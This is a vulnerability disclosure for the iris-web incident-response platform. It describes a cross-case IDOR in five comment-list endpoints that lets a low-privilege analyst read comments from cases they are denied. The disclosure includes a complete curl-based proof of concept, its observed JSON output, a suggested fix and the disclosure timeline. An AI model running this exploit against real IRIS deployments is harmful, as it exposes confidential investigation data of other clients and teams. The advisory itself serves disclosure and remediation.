https://github.com/dfir-iris/iris-web

## Finding: Cross-case IDOR: comment-list endpoints in iris-web disclose comments from unauthorized cases

## Details:

There is a cross-case Insecure Direct Object Reference (IDOR) vulnerability in iris-web affecting all released versions up to and including v2.4.27.

**Vulnerable endpoints:**
- `GET /case/notes/<id>/comments/list`
- `GET /case/tasks/<id>/comments/list`
- `GET /case/ioc/<id>/comments/list`
- `GET /case/assets/<id>/comments/list`
- `GET /case/evidences/<id>/comments/list`

**Root cause:** Each endpoint validates that the requesting user has access to the case specified by the `cid` query parameter, but does not verify that the object ID in the URL path (`<id>`) belongs to that case. Because object IDs (note IDs, task IDs, IOC IDs, etc.) are sequential integers shared across all cases, an analyst with read access to any single case can read comments attached to objects in all other cases.

**Impact:** In a multi-team or multi-client IRIS deployment where cases are access-controlled per analyst, any analyst can read the full comment history on notes, tasks, IOCs, assets, and evidences belonging to cases they have no access to.

### PoC

Prerequisites:
- Running IRIS instance (tested against v2.4.20 via the official docker-compose)
- Admin account (password set via `IRIS_ADM_PASSWORD` env var); API key from DB or `/user/token/renew`
- A "lowpriv" analyst account with full_access to caseA (id=2) only; explicitly denied caseB (id=3)

**Step 1 -- Admin setup (as administrator):**

```bash
ADMIN_KEY="<admin_api_key>"
BASE="https://iris.local:8443"

# Create caseA and caseB
CASEA_ID=$(curl -sk -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -X POST "$BASE/manage/cases/add" \
  -d '{"case_name":"CaseA","case_description":"Accessible","case_customer":1,"case_soc_id":"a"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['case_id'])")

CASEB_ID=$(curl -sk -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -X POST "$BASE/manage/cases/add" \
  -d '{"case_name":"CaseB SECRET","case_description":"Restricted","case_customer":1,"case_soc_id":"b"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['case_id'])")

# Create lowpriv user (placed in Analysts group - no auto-follow)
LOWPRIV_KEY=$(curl -sk -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -X POST "$BASE/manage/users/add" \
  -d '{"user_login":"lowpriv","user_name":"Low Priv","user_email":"lp@test.local","user_password":"LowPriv2024!","user_isadmin":false}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['user_api_key'])")

LOWPRIV_ID=2   # or parse from response

# Grant lowpriv FULL ACCESS to caseA only; deny caseB (lowpriv never gets explicit access to caseB)
curl -sk -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -X POST "$BASE/manage/users/${LOWPRIV_ID}/groups/update" \
  -d '{"groups_membership": [2]}'

curl -sk -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -X POST "$BASE/manage/users/${LOWPRIV_ID}/cases-access/update" \
  -d "{\"cases_list\": [$CASEA_ID], \"access_level\": 4}"

# Create directory and note in caseB, then add a secret comment
DIR_ID=$(curl -sk -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -X POST "$BASE/case/notes/directories/add?cid=$CASEB_ID" \
  -d "{\"name\":\"CaseB Notes\",\"cid\":$CASEB_ID}" \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['id'])")

NOTE_ID=$(curl -sk -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -X POST "$BASE/case/notes/add?cid=$CASEB_ID" \
  -d "{\"note_title\":\"SECRET NOTE\",\"note_content\":\"Classified info\",\"directory_id\":$DIR_ID,\"cid\":$CASEB_ID}" \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['note_id'])")

curl -sk -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -X POST "$BASE/case/notes/${NOTE_ID}/comments/add?cid=$CASEB_ID" \
  -d "{\"comment_text\":\"SECRET: Victim CEO email victim@target.com, threat actor used CVE-2024-XXXXX\",\"cid\":$CASEB_ID}"

echo "Setup complete. CaseB note ID: $NOTE_ID, lowpriv key: $LOWPRIV_KEY"
```

**Step 2 -- Verify lowpriv is blocked from caseB directly:**

```bash
curl -sk -H "Authorization: Bearer $LOWPRIV_KEY" \
  "$BASE/manage/cases/$CASEB_ID?cid=$CASEB_ID"
# Returns: {"status":"error","message":"Permission denied",...}
```

**Step 3 -- Exploit: lowpriv reads caseB secret note comment using caseA cid:**

```bash
curl -sk -H "Authorization: Bearer $LOWPRIV_KEY" \
  "$BASE/case/notes/${NOTE_ID}/comments/list?cid=$CASEA_ID"
```

**Observed output (live on v2.4.20):**

```json
{
    "status": "success",
    "message": "",
    "data": [
        {
            "user": {
                "id": 1,
                "user_name": "administrator",
                "user_login": "administrator",
                "user_email": "administrator@localhost"
            },
            "comment_id": 2,
            "comment_uuid": "34d7d121-9d88-4673-8978-8b11f0e02664",
            "comment_text": "SECRET_NOTE_COMMENT: Victim CEO email: victim@target.com, threat actor used CVE-2024-XXXXX",
            "comment_date": "2026-06-19T13:15:54.924928",
            "comment_update_date": "2026-06-19T13:15:54.924932",
            "comment_user_id": 1,
            "comment_case_id": 3,
            "comment_alert_id": null
        }
    ]
}
```

The `comment_case_id: 3` in the response confirms the comment belongs to caseB (id=3) -- a case the requesting user has no access to.

The same IDOR works against all five object types. Identical requests replacing `notes` with `tasks`, `ioc`, `assets`, or `evidences` and the appropriate object ID also return secret comments from caseB.


**Suggested fix:** Before returning comments, validate that the object belongs to `caseid` using the existing filtered lookup (e.g., `get_note(cur_id, caseid=caseid)`) -- the same check already present in the sibling `comments/add` endpoints.


### Disclosure
 - 19 June 2026 - reported via email
 - 17 August 2026 - followed up on email
 - 14 September 2026 - still no response; disclosed
